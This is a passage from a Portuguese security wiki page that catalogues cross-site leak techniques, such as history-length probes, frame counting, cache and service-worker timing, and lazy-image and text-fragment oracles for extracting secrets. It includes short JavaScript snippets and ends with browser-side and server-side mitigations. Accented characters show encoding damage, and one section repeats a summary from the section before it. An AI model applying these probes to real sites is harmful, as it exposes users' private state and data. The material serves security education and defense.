* **Resumo**: Abusa do limite de redirecionamentos para detectar redirecionamentos.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Se o n√∫mero **m√°ximo** de **redirecionamentos** a serem seguidos por um navegador for **20**, um atacante pode tentar carregar sua p√°gina com **19 redirecionamentos** e, finalmente, **enviar a v√≠tima** para a p√°gina testada. Se um **erro** for acionado, ent√£o a p√°gina estava tentando **redirecionar a v√≠tima**.

### Comprimento do Hist√≥rico

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Redirecionamentos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Resumo**: O c√≥digo JavaScript manipula o hist√≥rico do navegador e pode ser acessado pela propriedade de comprimento.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

A API de Hist√≥rico permite que o c√≥digo JavaScript manipule o hist√≥rico do navegador, que **salva as p√°ginas visitadas por um usu√°rio**. Um atacante pode usar a propriedade de comprimento como um m√©todo de inclus√£o: para detectar navega√ß√µes JavaScript e HTML.\
Verificando `history.length`, fazendo um usu√°rio **navegar** para uma p√°gina, **voltar** para a mesma origem e **verificando** o novo valor de **`history.length`**.

### Comprimento do Hist√≥rico com a mesma URL

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Se a URL √© a mesma que a adivinhada
* **Resumo**: √â poss√≠vel adivinhar se a localiza√ß√£o de um frame/pop-up est√° em uma URL espec√≠fica abusando do comprimento do hist√≥rico.
* **Exemplo de C√≥digo**: Abaixo

Um atacante pode usar c√≥digo JavaScript para **manipular a localiza√ß√£o do frame/pop-up para uma adivinhada** e **imediatamente** **alter√°-la para `about:blank`**. Se o comprimento do hist√≥rico aumentar, significa que a URL estava correta e teve tempo para **aumentar porque a URL n√£o √© recarregada se for a mesma**. Se n√£o aumentar, significa que **tentou carregar a URL adivinhada**, mas porque **imediatamente depois** carregamos **`about:blank`**, o **comprimento do hist√≥rico nunca aumentou** ao carregar a URL adivinhada.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Contagem de Frames

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumo**: Ler o n√∫mero de frames (window.length).
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar o **n√∫mero de frames em uma p√°gina da web** aberta via `iframe` ou `window.open` pode ajudar a identificar o **status do usu√°rio sobre aquela p√°gina**.\
Al√©m disso, se a p√°gina sempre tiver o mesmo n√∫mero de frames, verificar **continuamente** o n√∫mero de frames pode ajudar a identificar um **padr√£o** que pode vazar informa√ß√µes.

Um exemplo dessa t√©cnica √© que no Chrome, um **PDF** pode ser **detectado** com **contagem de frames** porque um `embed` √© usado internamente. Existem [Par√¢metros de URL Abertos](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permitem algum controle sobre o conte√∫do, como `zoom`, `view`, `page`, `toolbar`, onde essa t√©cnica pode ser interessante.

### HTMLElements

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumo**: Ler o valor vazado para distinguir entre 2 estados poss√≠veis
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Algumas p√°ginas da web podem **gerar dinamicamente arquivos de m√≠dia** dependendo das informa√ß√µes do usu√°rio ou adicionar marcas d'√°gua que alteram o tamanho da m√≠dia. Um atacante pode usar informa√ß√µes vazadas por esses elementos HTML para distinguir entre estados poss√≠veis.

Alguns HTMLElements vazam algumas informa√ß√µes para origens cruzadas, como o tipo de m√≠dia que s√£o:

* [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) vaza a `dura√ß√£o` da m√≠dia e os tempos `buffered`.
* [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) vaza a `videoHeight` e `videoWidth`, alguns navegadores tamb√©m podem ter `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` e `webkitDecodedFrameCount`.
* [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) vaza o `totalVideoFrames`.
* [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) vaza a `altura` e `largura`, mas se a imagem for inv√°lida, elas ser√£o 0 e [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) ser√° rejeitado.

### Propriedade CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumo**: Detectar a estiliza√ß√£o do site dependendo do status do usu√°rio.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Aplica√ß√µes da web podem alterar a **estiliza√ß√£o do site dependendo do status do usu√°rio**. Arquivos CSS de origens cruzadas podem ser incorporados na p√°gina do atacante com o **elemento de link HTML**, e as **regras** ser√£o **aplicadas** √† p√°gina do atacante. Se uma p√°gina alterar dinamicamente essas regras, um atacante pode **detectar** essas **diferen√ßas** dependendo do estado do usu√°rio.\
Como t√©cnica de vazamento, o atacante pode usar o m√©todo `window.getComputedStyle` para **ler as propriedades CSS** de um elemento HTML espec√≠fico. Como resultado, um atacante pode ler propriedades CSS arbitr√°rias se o elemento afetado e o nome da propriedade forem conhecidos.

### Hist√≥rico CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumo**: Detectar se o estilo `:visited` √© aplicado a uma URL, indicando que ela j√° foi visitada
* **Exemplo de C√≥digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
De acordo com [**isso**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), isso n√£o funciona no Chrome sem interface gr√°fica.
{% endhint %}

Usando o seletor CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited), √© poss√≠vel aplicar um estilo diferente para URLs que foram visitadas.\
Anteriormente, era poss√≠vel usar [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) para detectar essa diferen√ßa, mas agora os navegadores impedem isso, retornando sempre valores como se o link tivesse sido visitado e limitando quais estilos podem ser aplicados usando o seletor.\
Portanto, pode ser necess√°rio enganar o usu√°rio para clicar em uma √°rea em que o CSS tenha afetado isso pode ser feito usando [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode).\
Tamb√©m existem maneiras de fazer isso sem intera√ß√£o do usu√°rio, como abusar dos tempos de renderiza√ß√£o, isso funciona porque leva tempo para pintar os links com uma cor diferente.\
Foi fornecido um PoC em um relat√≥rio do Chromium que funciona usando v√°rios links para aumentar a diferen√ßa de tempo.
### Vazamento de X-Frame do Documento de Conte√∫do

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Headers
* **Mais informa√ß√µes**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumo:** No GC, quando uma p√°gina n√£o pode ser incorporada em uma p√°gina de origem cruzada devido a **X-Frame-Options, uma p√°gina de erro √© exibida**.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

No Chrome, quando uma p√°gina n√£o pode ser incorporada em uma p√°gina de origem cruzada, porque o cabe√ßalho **X-FrameOptions** (XFO) est√° definido como negar ou mesma origem, uma **p√°gina de erro √© exibida em seu lugar**. Para objetos, essa p√°gina de erro pode ser **detectada verificando a propriedade `contentDocument`**. Normalmente, essa propriedade retorna nulo porque o acesso a um documento incorporado de origem cruzada n√£o √© permitido. No entanto, devido √† **renderiza√ß√£o do Chrome** da p√°gina de erro, um **objeto de documento vazio** √© retornado em seu lugar. Isso n√£o funciona para iframes ou em outros navegadores. Os desenvolvedores podem esquecer de definir X-Frame-Options para todas as p√°ginas e, especialmente, as p√°ginas de erro frequentemente n√£o possuem esse cabe√ßalho. Como t√©cnica de vazamento, um invasor pode ser capaz de diferenciar entre diferentes estados do usu√°rio verificando isso.

### Detec√ß√£o de Download

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Headers
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumo:** O invasor pode detectar downloads usando iframes. Se o iframe ainda for acess√≠vel, o arquivo foi baixado.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

O cabe√ßalho `Content-Disposition` ([`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)) indica se o navegador deve fazer o download do conte√∫do ou exibi-lo inline.

Se apenas um usu√°rio logado pudesse **acessar uma p√°gina que far√° o download de um arquivo** porque est√° usando o cabe√ßalho. √â poss√≠vel detectar esse comportamento.

#### Barra de download <a href="#download-bar" id="download-bar"></a>

Nos navegadores baseados em Chromium, quando um arquivo √© baixado, uma pr√©via do processo de download **aparece em uma barra na parte inferior**, integrada √† janela do navegador. Ao **monitorar a altura da janela**, os invasores podem detectar se a "barra de download" foi aberta.

#### Navega√ß√£o de Download (com iframes) <a href="#download-navigation-with-iframes" id="download-navigation-with-iframes"></a>

Outra maneira de testar o cabe√ßalho [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) √© **verificar se ocorreu uma navega√ß√£o**. Se um carregamento de p√°gina causa um download, ele n√£o aciona uma navega√ß√£o e a **janela permanece na mesma origem**.

#### Navega√ß√£o de Download (sem iframes) <a href="#download-navigation-without-iframes" id="download-navigation-without-iframes"></a>

Mesma t√©cnica que a anterior, mas usando `window.open` em vez de iframes.

### Bypass de Cache HTTP Particionada <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Tempo
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumo:** O invasor pode detectar downloads usando iframes. Se o iframe ainda for acess√≠vel, o arquivo foi baixado.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
√â por isso que essa t√©cnica √© interessante: o Chrome agora possui **particionamento de cache**, e a chave de cache da p√°gina rec√©m-aberta √©: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, mas se eu abrir uma p√°gina ngrok e usar fetch nela, a chave de cache ser√°: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, a **chave de cache √© diferente**, portanto, a cache n√£o pode ser compartilhada. Voc√™ pode encontrar mais detalhes aqui: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Coment√°rio de [**aqui**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Se um site `example.com` incluir um recurso de `*.example.com/resource`, esse recurso ter√° a **mesma chave de cache** como se o recurso fosse diretamente **solicitado por meio de navega√ß√£o de n√≠vel superior**. Isso ocorre porque a chave de cache √© composta pelo _eTLD+1_ de n√≠vel superior e pelo _eTLD+1_ do quadro.

Como acessar o cache √© mais r√°pido do que carregar um recurso, √© poss√≠vel tentar alterar a localiza√ß√£o de uma p√°gina e cancel√°-la 20ms (por exemplo) depois. Se a origem foi alterada ap√≥s a interrup√ß√£o, significa que o recurso foi armazenado em cache.\
Ou pode-se apenas **enviar um fetch para a p√°gina potencialmente armazenada em cache e medir o tempo que leva**.

### Redirecionamento Manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Redirecionamentos
* **Mais informa√ß√µes**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Resumo:** √â poss√≠vel descobrir se uma resposta a uma solicita√ß√£o de busca √© um redirecionamento.
* **Exemplo de c√≥digo**:

![](<../.gitbook/assets/image (652).png>)
### Fetch com AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Tempo
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumo**: √â poss√≠vel tentar carregar um recurso e interromper o carregamento antes que ele seja conclu√≠do. Dependendo se um erro √© acionado, o recurso foi ou n√£o armazenado em cache.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

[**`AbortController`**](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) pode ser combinado com _**fetch**_ e _**setTimeout**_ para detectar se o **recurso est√° armazenado em cache** e para remover um recurso espec√≠fico do cache do navegador. Uma caracter√≠stica interessante dessa t√©cnica √© que a sondagem ocorre sem armazenar novo conte√∫do no processo.

### Polui√ß√£o de Script

* **M√©todos de Inclus√£o**: Elementos HTML (script)
* **Diferen√ßa Detect√°vel**: Conte√∫do da p√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Resumo**: Quando um **script de origem cruzada** √© inclu√≠do em uma p√°gina, n√£o √© poss√≠vel ler seu conte√∫do diretamente. No entanto, se um script **usa quaisquer fun√ß√µes embutidas**, √© poss√≠vel **sobrescrev√™-las** e ler seus argumentos, o que pode **vazar informa√ß√µes valiosas**.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da p√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Resumo**: Medir o tempo de execu√ß√£o de um site usando service workers.
* **Exemplo de c√≥digo**:

1. O atacante registra um service worker em um de seus dom√≠nios (attacker.com).
2. No documento principal, o atacante emite uma navega√ß√£o (window.open) para o site alvo e instrui o Service Worker a iniciar um temporizador.
3. Quando a nova janela come√ßa a carregar, o atacante navega para a refer√™ncia obtida no passo 2 para uma p√°gina manipulada pelo Service Worker.
4. Quando a solicita√ß√£o feita no passo 3 chega ao service worker, ele retorna uma resposta 204 (Sem conte√∫do), o que interrompe a navega√ß√£o.
5. Neste ponto, o Service Worker coleta uma medi√ß√£o do temporizador iniciado no passo 2. Essa medi√ß√£o √© afetada pelo tempo que o JavaScript bloqueou a navega√ß√£o.

{% hint style="warning" %}
Em uma medi√ß√£o de tempo de execu√ß√£o, √© poss√≠vel **eliminar** **fatores de rede** para obter **medi√ß√µes mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Tempo de Fetch

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao conte√∫do da p√°gina, c√≥digo de status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Resumo**: A API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios podem ser usados.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Tempo entre Janelas

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao conte√∫do da p√°gina, c√≥digo de status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Resumo**: A API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o usando `window.open`. Outros rel√≥gios podem ser usados.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para criar e **automatizar fluxos de trabalho** com facilidade, usando as ferramentas da comunidade mais avan√ßada do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Com HTML ou Re Inje√ß√£o

Aqui voc√™ encontrar√° t√©cnicas para extrair informa√ß√µes de um HTML de origem cruzada **injetando conte√∫do HTML**. Essas t√©cnicas s√£o interessantes em casos em que, por qualquer motivo, voc√™ pode **injetar HTML, mas n√£o pode injetar c√≥digo JS**.

### Marca√ß√£o Pendente

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Carregamento Pregui√ßoso de Imagens

Se voc√™ precisa **extrair conte√∫do** e pode **adicionar HTML antes do segredo**, voc√™ deve verificar as **t√©cnicas comuns de marca√ß√£o pendente**.\
No entanto, se por algum motivo voc√™ **PRECISAR** fazer isso **caractere por caractere** (talvez a comunica√ß√£o seja via cache), voc√™ pode usar esse truque.

As **imagens** em HTML t√™m um atributo "**loading**" cujo valor pode ser "**lazy**". Nesse caso, a imagem ser√° carregada quando for visualizada e n√£o durante o carregamento da p√°gina:
```html
<img src=/something loading=lazy >
```
Portanto, o que voc√™ pode fazer √© **adicionar muitos caracteres aleat√≥rios** (por exemplo, **milhares de "W"**) para **preencher a p√°gina da web antes do segredo ou adicionar algo como** `<br><canvas height="1850px"></canvas><br>.`\
Ent√£o, se por exemplo a **inje√ß√£o aparecer antes da flag**, a **imagem** ser√° **carregada**, mas se aparecer **depois** da **flag**, a flag + o lixo ir√£o **impedir que ela seja carregada** (voc√™ precisar√° brincar com a quantidade de lixo a ser colocada). Isso √© o que aconteceu neste [**relat√≥rio**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Outra op√ß√£o seria usar o **scroll-to-text-fragment** se permitido:

#### Scroll-to-text-fragment

No entanto, fa√ßa o **bot acessar a p√°gina** com algo como
```
#:~:text=SECR
```
Ent√£o a p√°gina da web ser√° algo como: **`https://vitima.com/post.html#:~:text=SECR`**

Onde post.html cont√©m os caracteres maliciosos do atacante e a imagem de carregamento lento e em seguida o segredo do bot √© adicionado.

O que este texto far√° √© fazer com que o bot acesse qualquer texto na p√°gina que contenha o texto `SECR`. Como esse texto √© o segredo e est√° logo abaixo da imagem, a imagem s√≥ ser√° carregada se o segredo adivinhado estiver correto. Ent√£o voc√™ tem seu or√°culo para extrair o segredo caractere por caractere.

Alguns exemplos de c√≥digo para explorar isso: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Carregamento Lento de Imagem Baseado em Tempo

Se n√£o for poss√≠vel carregar uma imagem externa que possa indicar ao atacante que a imagem foi carregada, outra op√ß√£o seria tentar adivinhar o caractere v√°rias vezes e medir isso. Se a imagem for carregada, todas as solicita√ß√µes levar√£o mais tempo do que se a imagem n√£o for carregada. Isso √© o que foi usado na [solu√ß√£o deste writeup](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) resumido aqui:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Se `jQuery(location.hash)` for usado, √© poss√≠vel descobrir atrav√©s do tempo se algum conte√∫do HTML existe, isso ocorre porque se o seletor `main[id='site-main']` n√£o corresponder, n√£o √© necess√°rio verificar o restante dos seletores:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inje√ß√£o de CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defesas

Nesta se√ß√£o, voc√™ pode encontrar parte das mitiga√ß√µes recomendadas em [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), no entanto, existem mais mitiga√ß√µes em cada se√ß√£o do wiki [https://xsleaks.dev/](https://xsleaks.dev/). D√™ uma olhada l√° para obter mais informa√ß√µes sobre como se proteger dessas t√©cnicas.

### Mitiga√ß√µes do M√©todo de Inclus√£o

* **Elementos HTML**. Pode-se usar o **cabe√ßalho CORP para controlar se as p√°ginas podem incorporar um recurso**. O CORP pode ser definido como mesma origem ou mesmo site e bloqueia qualquer solicita√ß√£o de origem cruzada ou de site cruzado para esse recurso. No **lado do cliente**, os navegadores baseados em Chromium usam o algoritmo **CORB** para decidir se as solicita√ß√µes de recursos de origem cruzada devem ser permitidas ou negadas.
* **Frames**. A principal defesa para **impedir que elementos iframe** carreguem recursos HTML √© o uso de **X-Frame-Options**. Alternativamente, a diretiva **frame-ancestors do CSP** pode alcan√ßar um resultado semelhante. Se a incorpora√ß√£o for negada, o m√©todo de inclus√£o n√£o pode detectar uma diferen√ßa nas respostas.
* **Pop-ups**. Para restringir o acesso ao `window.opener`, o cabe√ßalho de resposta HTTP **COOP** define tr√™s valores diferentes: unsafe-none (padr√£o), same-origin-allow-popups e same-origin. Esses valores podem ser usados para **isolar guias de navega√ß√£o e pop-ups** e, assim, mitigar t√©cnicas de vazamento baseadas em pop-ups.
* **Solicita√ß√µes JavaScript**. As solicita√ß√µes JavaScript de origem cruzada s√£o frequentemente usadas em ataques XS-Leak, porque um invasor tem controle refinado sobre a solicita√ß√£o emitida. No entanto, como essas solicita√ß√µes n√£o t√™m suporte para CORS, elas est√£o sujeitas √†s mesmas restri√ß√µes que as solicita√ß√µes enviadas por elementos HTML, como scripts ou imagens. Assim, o impacto dessa t√©cnica de vazamento tamb√©m pode ser **mitigado por CORP e CORB**.

M√©todos mais gen√©ricos:

* **Metadados de Fetch**. Esses cabe√ßalhos de solicita√ß√£o permitem que os propriet√°rios do servidor entendam melhor como o navegador do usu√°rio causou uma solicita√ß√£o espec√≠fica. No Chrome, os cabe√ßalhos Sec-Fetch-\* s√£o adicionados automaticamente a cada solicita√ß√£o e fornecem metadados sobre a proced√™ncia da solicita√ß√£o. Por exemplo, Sec-Fetch-Dest: image foi acionado a partir de um elemento de imagem. As aplica√ß√µes da web podem ent√£o optar por bloquear solicita√ß√µes com base nessas informa√ß√µes.
* **Cookies Same-Site**. A flag Same-Site nos cookies permite que os sites declarem **se um cookie deve ser restrito ao contexto do mesmo site ou do primeiro site**. Todos os principais navegadores suportam cookies Same-Site. No Google Chrome, os cookies sem o atributo agora s√£o Lax por padr√£o. Para XS-Leaks, **os cookies Same-Site limitam drasticamente as possibilidades de ataque de vazamento**. Por outro lado, as t√©cnicas de vazamento que dependem de **`window.open` ainda funcionam com `SameSite=Lax`**. Os sites que usam **outros m√©todos de autentica√ß√£o**, como certificados do lado do cliente e autentica√ß√£o HTTP, **permanecem vulner√°veis**.
* **Desvincula√ß√£o de Identificador de Origem Cruzada (COIU)**. O COIU, tamb√©m conhecido como Isolamento de Primeira Parte (FPI), √© um recurso de seguran√ßa opcional que os usu√°rios podem habilitar nas configura√ß√µes avan√ßadas do Firefox (about:config) e foi inicialmente introduzido no Tor Browser. Em uma vis√£o abstrata, ele √© um contexto de mesma origem estendido. Ele **vincula v√°rios recursos** (por exemplo, cookies, cache, armazenamento do lado do cliente) **√† primeira parte** em vez de compartilh√°-los entre todos os sites visitados. Se habilitado, o COIU diminui drasticamente a aplicabilidade de XS-Leaks, pois apenas os m√©todos que usam pop-ups ainda s√£o poss√≠veis para atender ao requisito de primeira parte da pol√≠tica.
* **Prote√ß√µes de Rastreamento**. A Apple implementou um mecanismo de privacidade chamado **Preven√ß√£o Inteligente de Rastreamento (ITP)** no Safari, que visa combater o rastreamento entre sites limitando as capacidades de cookies e outras APIs da web. Nas vers√µes mais recentes do Safari, o ITP bloqueia todos os cookies de terceiros por padr√£o, sem exce√ß√µes \[74]. Esse bloqueio impede todos os vazamentos que n√£o s√£o baseados em pop-ups. O Firefox adotou uma abordagem semelhante com a Preven√ß√£o de Rastreamento Aprimorada (ETP), mas eles bloqueiam apenas cookies de terceiros espec√≠ficos pertencentes a provedores de rastreamento. No contexto de XS-Leaks, o ETP apenas mitiga as t√©cnicas de vazamento que visam esses dom√≠nios de rastreamento.
* **Extens√µes de Navegador**. Usu√°rios conscientes da seguran√ßa podem usar **extens√µes de navegador para prevenir certos m√©todos de inclus√£o**.

### Mitiga√ß√µes de T√©cnicas de Vazamento

* **Manipulador de Eventos**. A **mitiga√ß√£o mais eficaz** para essa t√©cnica de vazamento seria **negar todos eles**, mas isso quebraria a maioria das aplica√ß√µes da web na Internet. Portanto, propomos **reduzir o n√∫mero de informa√ß√µes necess√°rias que podem ser coletadas nos eventos**. Por exemplo, o evento de viola√ß√£o de CSP n√£o deve conter a URL de destino de redirecionamento no campo blockedURI. Esse comportamento est√° implementado no Firefox e nas vers√µes mais recentes do Google Chrome - apenas o Safari ainda est√° vulner√°vel.
* **Mensagens de Erro**. Para mitigar XS-Leaks baseados na t√©cnica de vazamento de mensagens de erro, existem dois requisitos principais. Primeiro, **as mensagens de erro n√£o devem conter informa√ß√µes detalhadas**, assim como as mensagens de manipulador de eventos. Segundo, os navegadores devem **minimizar a ocorr√™ncia de mensagens de erro**. XS-Leaks como SRI Error, ContentDocument XFO ou Fetch Redirect detectam se uma mensagem de erro √© lan√ßada ou n√£o.
